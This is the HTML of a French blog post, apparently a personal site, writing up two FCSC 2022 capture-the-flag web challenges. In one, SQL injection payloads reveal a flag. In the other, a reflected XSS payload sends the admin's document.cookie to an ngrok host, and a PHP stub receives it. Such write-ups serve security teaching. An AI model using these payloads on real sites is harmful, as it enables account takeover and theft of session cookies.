@@ -1,0 +1,440 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               FCSC 2022 - Web &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="FCSC 2022 - Web - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="FCSC 2022 - Web">
+    <meta itemprop="description" content="FCSC 2022 - Web - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="FCSC 2022 - Web">
+    <meta property="og:description" content="FCSC 2022 - Web - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/fr/article/fcsc2022-web/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/fr/article/fcsc2022-web/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/fr/article/fcsc2022-web/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/" class="active">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/fr/article/fcsc2022-web/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/fr/article/fcsc2022-web/">
+            FCSC 2022 - Web
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2022-05-19</span>
+            
+        
+
+        
+            
+                <span class="readingTime">2 Min. lecture</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/writeup/">writeup</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/fcsc/">fcsc</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/FCSC2022/Web/fcsc2022.png" alt=""></p>
+<h1 id="résumé-rapide">Résumé rapide</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#chapristi-12">Chapristi 1/2</a></li>
+    <li><a href="#gare-au-gorille">Gare au gorille</a></li>
+  </ul>
+</nav>
+<h2 id="chapristi-12">Chapristi 1/2</h2>
+<p><img src="/img/FCSC2022/Web/EN_chapristi.png" alt=""></p>
+<p>Le but est de trouver un meme caché, il y a un champ <code>search</code> sur la page d&rsquo;accueil. Si je tente de mettre <code>test</code> avec une quote, un message d&rsquo;erreur apparaît, <code>pq</code> <a href="https://tousu.in/qa/?qa=200842/">indique</a> que la base de données est en PostgreSQL.</p>
+<p><img src="/img/FCSC2022/Web/chapristi_error.png" alt=""></p>
+<p>Avec le payload <code>test'--</code>, j&rsquo;obtiens une erreur de syntaxe à la fin de l&rsquo;input.</p>
+<p><img src="/img/FCSC2022/Web/chapristi_error2.png" alt=""></p>
+<p>Si j&rsquo;essaye d&rsquo;afficher tous les mêmes du site avec le payload <code>test' or 1=1--</code>, j&rsquo;obtiens le même retour. Et si j&rsquo;ajoute une <code>)</code> à la fin de l&rsquo;input pour casser le contexte, le flag s&rsquo;affiche.</p>
+<p><img src="/img/FCSC2022/Web/chapristi_flag.png" alt=""></p>
+<p>FCSC{1D32671928B0DFD5E0B92B57871B1D49}</p>
+<h2 id="gare-au-gorille">Gare au gorille</h2>
+<p><img src="/img/FCSC2022/Web/EN-gare_au_gorille.png" alt=""></p>
+<p>Sur la page d&rsquo;accueil, le champ <code>search</code> est vulnérable à une XSS reflected avec le payload <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
+<p><img src="/img/FCSC2022/Web/gorille_search.png" alt=""></p>
+<p>Il y a aussi la possibilité de report un flag à l&rsquo;admin en cliquant sur le drapeau de course d&rsquo;un meme</p>
+<p><img src="/img/FCSC2022/Web/gorille_drap.png" alt=""></p>
+<p>Seul l&rsquo;admin a la possibilité d&rsquo;ajouter un meme</p>
+<p><img src="/img/FCSC2022/Web/gorille_add.png" alt=""></p>
+<p>Mise en place de ngrok pour voler le token de l&rsquo;admin</p>
+<p>Ngrok est une application multiplateforme qui expose les ports des serveurs locaux à l&rsquo;Internet. C&rsquo;est facile à configurer, il suffit de deux minutes et la <a href="https://ngrok.com/download">documentation</a>. Exposition du port <code>4444</code> avec python et setup de ngrok.</p>
+<p><img src="/img/FCSC2022/Web/gorille_ngrok.png" alt=""></p>
+<p><img src="/img/FCSC2022/Web/gorille_python.png" alt=""></p>
+<p>Pour récupérer le token de l&rsquo;administrateur, je vais créer un fichier <code>file.php</code> basique.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$cookie <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;cookie&#34;</span>];
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Avec cookie editor, on peut voir que la valeur de notre token est la suivante <code>HV6nHr2m6TYGOOaFtikDwlWRC9FLjtAVer5bzkCEvNSM8kgH7w82BD4zUdflWIwR</code>.</p>
+<p><img src="/img/FCSC2022/Web/gorille_cookie.png" alt=""></p>
+<p>Récupération du cookie de l&rsquo;administrateur avec le payload suivant dans l&rsquo;URL <code>https://gare-au-gorille.france-cybersecurity-challenge.fr/report?url=/?search=</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>window.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">`https://a6d5-90-39-121-143.eu.ngrok.io/file.php?cookie=</span><span style="color:#e6db74">${</span>document.<span style="color:#a6e22e">cookie</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</code></pre></div><p><img src="/img/FCSC2022/Web/gorille_payload.png" alt=""></p>
+<p>Dans ngrok inspect, on retrouve le token de l&rsquo;admin</p>
+<p><img src="/img/FCSC2022/Web/gorille_inspect.png" alt=""></p>
+<p>Modification du cookie et actualisation de la page</p>
+<p><img src="/img/FCSC2022/Web/gorille_tokenadm.png" alt=""></p>
+<p>Pour récupérer le flag, il suffit de cliquer sur Ajouter un meme</p>
+<p><img src="/img/FCSC2022/Web/gorille_flag.png" alt=""></p>
+<p>FCSC{14b15680de4e305b89eaa2a07b137abf4e39b5773f39a4ea7155ca5387c6f59e}</p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/fcsc2022/">fcsc2022</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/web/">web</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/article/fcsc2022-web/">en</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Derniers articles</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/advuln/">Mise en place d&#39;un environnement AD vulnérable</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/fr/categories/"><strong>Catégories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/fr/categories/ctf">Ctf
+                        (27)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/htb">Htb
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/write-up">Write up
+                        (22)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/linux">Linux
+                        (17)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/writeup">Writeup
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Des médias sociaux</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Autres langues</strong>
+                
+                
+                <a href="//luksec.fr/">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/" class="active">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
